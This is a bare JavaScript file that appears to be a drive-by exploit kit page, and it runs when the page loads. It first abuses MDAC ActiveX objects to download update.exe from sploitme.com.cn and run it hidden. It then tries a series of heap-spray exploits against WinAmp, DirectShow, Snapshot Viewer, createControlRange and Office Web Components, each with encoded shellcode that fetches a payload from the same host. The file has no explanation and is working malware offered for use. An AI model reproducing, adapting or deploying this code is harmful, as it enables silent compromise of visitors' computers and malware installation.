function Complete() {
    setTimeout('location.href = "about:blank', 2000);
}

function CheckIP() {
    var req = null;
    try {
        req = new ActiveXObject("Msxml2.XMLHTTP");
    } catch (e) {
        try {
            req = new ActiveXObject("Microsoft.XMLHTTP");
        } catch (e) {
            try {
                req = new XMLHttpRequest();
            } catch (e) {}
        }
    }
    if (req == null) return "0";
    req.open("GET", "/fg/show.php?get_ajax=1&r=" + Math.random(), false);
    req.send(null);
    if (req.responseText == "1") {
        return true;
    } else {
        return false;
    }
}
var urltofile = 'http://sploitme.com.cn/fg/load.php?e=1';
var filename = 'update.exe';

function CreateO(o, n) {
    var r = null;
    try {
        r = o.CreateObject(n)
    } catch (e) {}
    if (!r) {
        try {
            r = o.CreateObject(n, '')
        } catch (e) {}
    }
    if (!r) {
        try {
            r = o.CreateObject(n, '', '')
        } catch (e) {}
    }
    if (!r) {
        try {
            r = o.GetObject('', n)
        } catch (e) {}
    }
    if (!r) {
        try {
            r = o.GetObject(n, '')
        } catch (e) {}
    }
    if (!r) {
        try {
            r = o.GetObject(n)
        } catch (e) {}
    }
    return r;
}

function Go(a) {
    var s = CreateO(a, 'WScript.Shell');
    var o = CreateO(a, 'ADODB.Stream');
    var e = s.Environment('Process');
    var xhr = null;
    var bin = e.Item('TEMP') + '\\' + filename;
    try {
        xhr = new XMLHttpRequest();
    } catch (e) {
        try {
            xhr = new ActiveXObject('Microsoft.XMLHTTP');
        } catch (e) {
            xhr = new ActiveXObject('MSXML2.ServerXMLHTTP');
        }
    }
    if (!xhr) return (0);
    xhr.open('GET', urltofile, false)
    xhr.send(null);
    var filecontent = xhr.responseBody;
    o.Type = 1;
    o.Mode = 3;
    o.Open();
    o.Write(filecontent);
    o.SaveToFile(bin, 2);
    s.Run(bin, 0);
}

function mdac() {
    var i = 0;
    var objects = new Array('{BD96C556-65A3-11D0-983A-00C04FC29E36}', '{BD96C556-65A3-11D0-983A-00C04FC29E36}', '{AB9BCEDD-EC7E-47E1-9322-D4A210617116}', '{0006F033-0000-0000-C000-000000000046}', '{0006F03A-0000-0000-C000-000000000046}', '{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}', '{6414512B-B978-451D-A0D8-FCFDF33E833C}', '{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}', '{06723E09-F4C2-43c8-8358-09FCD1DB0766}', '{639F725F-1B2D-4831-A9FD-874847682010}', '{BA018599-1DB3-44f9-83B4-461454C84BF8}', '{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}', '{E8CCCDDF-CA28-496b-B050-6C07C962476B}', null);
    while (objects[i]) {
        var a = null;
        if (objects[i].substring(0, 1) == '{') {
            a = document.createElement('object');
            a.setAttribute('classid', 'clsid:' + objects[i].substring(1, objects[i].length - 1));
        } else {
            try {
                a = new ActiveXObject(objects[i]);
            } catch (e) {}
        }
        if (a) {
            try {
                var b = CreateO(a, 'WScript.Shell');
                if (b) {
                    if (Go(a)) {
                        if (CheckIP()) {
                            Complete();
                        } else {
                            aolwinamp();
                        }
                        return true;
                    }
                }
            } catch (e) {}
        }
        i++;
    }
    aolwinamp();
}

function aolwinamp() {
    try {
        var obj = document.createElement('object');
        document.body.appendChild(obj);
        obj.id = 'IWinAmpActiveX';
        obj.width = '1';
        obj.height = '1';
        obj.data = './directshow.php';
        obj.classid = 'clsid:0955AC62-BF2E-4CBA-A2B9-A63F772D46CF';
        var shellcode = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u732F%u6C70%u696F%u6D74%u2E65%u6F63%u2E6D%u6E63%u662F%u2F67%u6F6C%u6461%u702E%u7068%u653F%u333D");
        var bigblock = unescape("%u0c0c%u0c0c");
        var headersize = 20;
        var slackspace = headersize + shellcode.length;
        while (bigblock.length < slackspace) bigblock += bigblock;
        var fillblock = bigblock.substring(0, slackspace);
        var block = bigblock.substring(0, bigblock.length - slackspace);
        while (block.length + slackspace < 0x40000) block = block + block + fillblock;
        var memory = new Array();
        for (var i = 0; i < 666; i++) {
            memory[i] = block + shellcode;
        }
        document.write('<SCRIPT language="VBScript">');
        document.write('bof=string(1400,unescape("%ff")) + string(1000,unescape("%0c"))');
        document.write('IWinAmpActiveX.ConvertFile bof,1,1,1,1,1');
        document.write('IWinAmpActiveX.ConvertFile bof,1,1,1,1,1');
        document.write('IWinAmpActiveX.ConvertFile bof,1,1,1,1,1');
        document.write('IWinAmpActiveX.ConvertFile bof,1,1,1,1,1');
        document.write('</SCRIPT>');
    } catch (e) {}
    directshow();
}

function directshow() {
    var shellcode = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u732F%u6C70%u696F%u6D74%u2E65%u6F63%u2E6D%u6E63%u662F%u2F67%u6F6C%u6461%u702E%u7068%u653F%u343D");
    var bigblock = unescape("%u9090%u9090");
    var headersize = 20;
    var slackspace = headersize + shellcode.length;
    while (bigblock.length < slackspace) bigblock += bigblock;
    var fillblock = bigblock.substring(0, slackspace);
    var block = bigblock.substring(0, bigblock.length - slackspace);
    while (block.length + slackspace < 0x40000) {
        block = block + block + fillblock;
    }
    var memory = new Array();
    for (var i = 0; i < 350; i++) {
        memory[i] = block + shellcode;
    }
    try {
        var obj = document.createElement('object');
        document.body.appendChild(obj);
        obj.width = '1';
        obj.height = '1';
        obj.data = './directshow.php';
        obj.classid = 'clsid:0955AC62-BF2E-4CBA-A2B9-A63F772D46CF';
        setTimeout("if (CheckIP()){ Complete(); } else { snapshot(); }", 1000);
    } catch (e) {
        snapshot();
    }
}

function snapshot() {
    var x;
    var obj;
    var mycars = new Array();
    mycars[0] = 'c:/Program Files/Outlook Express/wab.exe';
    mycars[1] = 'd:/Program Files/Outlook Express/wab.exe';
    mycars[2] = 'e:/Program Files/Outlook Express/wab.exe';
    try {
        var obj = new ActiveXObject('snpvw.Snapshot Viewer Control.1');
    } catch (e) {
        try {
            var obj = document.createElement('object');
            obj.setAttribute('classid', 'clsid:F0E42D50-368C-11D0-AD81-00A0C90DC8D9');
            obj.setAttribute('id', 'obj');
            obj.setAttribute('width', '1');
            obj.setAttribute('height', '1');
            document.body.appendChild(obj);
        } catch (e) {}
    }
    try {
        if (obj = '[object]') {
            for (x in mycars) {
                obj = new ActiveXObject('snpvw.Snapshot Viewer Control.1');
                var buf = mycars[x];
                obj.Zoom = 0;
                obj.ShowNavigationButtons = false;
                obj.AllowContextMenu = false;
                obj.SnapshotPath = 'http://sploitme.com.cn/fg/load.php?e=6';
                try {
                    obj.CompressedPath = buf;
                    obj.PrintSnapshot();
                    var snpelement = document.createElement('iframe');
                    snpelement.setAttribute('id', 'snapiframe');
                    snpelement.setAttribute('src', 'about:blank');
                    snpelement.setAttribute('width', 1);
                    snpelement.setAttribute('height', 1);
                    snpelement.setAttribute('style', 'display:none;');
                    document.body.appendChild(snpelement);
                    setTimeout("document.getElementById('snapiframe').src = 'ldap://';", 3000);
                } catch (e) {}
            }
        }
    } catch (e) {}
    com();
}

function com() {
    try {
        var obj = document.createElement('object');
        document.body.appendChild(obj);
        obj.setAttribute('classid', 'clsid:EC444CB6-3E7E-4865-B1C3-0DE72EF39B3F');
        if (obj) {
            var shcode = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u732F%u6C70%u696F%u6D74%u2E65%u6F63%u2E6D%u6E63%u662F%u2F67%u6F6C%u6461%u702E%u7068%u653F%u373D");
            var hbs = 0x100000;
            var sss = hbs - (shcode.length * 2 + 0x38);
            var hb = (0x0c0c0c0c - hbs) / hbs;
            var myvar = unescape("%u0C0C%u0C0C");
            var ss = myvar;
            while (ss.length * 2 < sss) {
                ss += ss;
            }
            ss = ss.substring(0, sss / 2);
            var m = new Array();
            for (var i = 0; i < hb; i++) {
                m[i] = ss + shcode;
            }
            var z = Math.ceil(0x0c0c0c0c);
            z = document.scripts[0].createControlRange().length;
        }
    } catch (e) {}
    spreadsheet();
}

function spreadsheet() {
    try {
        var objspread = new ActiveXObject('OWC10.Spreadsheet');
    } catch (e) {}
    if (objspread) {
        try {
            var shellcode = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u732F%u6C70%u696F%u6D74%u2E65%u6F63%u2E6D%u6E63%u662F%u2F67%u6F6C%u6461%u702E%u7068%u653F%u383D");
            var array = new Array();
            var ls = 0x81000 - (shellcode.length * 2);
            var bigblock = unescape("%u0b0c%u0b0C");
            while (bigblock.length < ls / 2) {
                bigblock += bigblock;
            }
            var lh = bigblock.substring(0, ls / 2);
            delete bigblock;
            for (var i = 0; i < 0x99 * 2; i++) {
                array[i] = lh + lh + shellcode;
            }
            CollectGarbage();
            var objspread = new ActiveXObject("OWC10.Spreadsheet");
            e = new Array();
            e.push(1);
            e.push(2);
            e.push(0);
            e.push(window);
            for (i = 0; i < e.length; i++) {
                for (j = 0; j < 10; j++) {
                    try {
                        objspread.Evaluate(e[i]);
                    } catch (e) {}
                }
            }
            window.status = e[3] + "";
            for (j = 0; j < 10; j++) {
                try {
                    objspread.msDataSourceObject(e[3]);
                } catch (e) {}
            }
        } catch (e) {}
    }
    Complete();
}
mdac();
